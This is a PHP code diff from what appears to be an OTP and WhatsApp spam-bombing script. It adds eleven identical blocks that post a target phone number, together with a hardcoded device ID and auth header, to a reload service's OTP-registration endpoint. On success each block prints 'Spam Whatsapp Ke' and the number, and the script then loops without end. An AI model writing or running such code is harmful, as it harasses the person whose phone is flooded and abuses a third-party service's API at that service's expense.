@@ -3324,6 +3324,283 @@ else{
 
 
 
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
+//CANDIRELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json',
+    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CANDIRELOAD ".$response."\n";
+}
+
+
+
 echo color("yellow"," Done Sensei..\n");
 sleep(3);
 goto lagi;
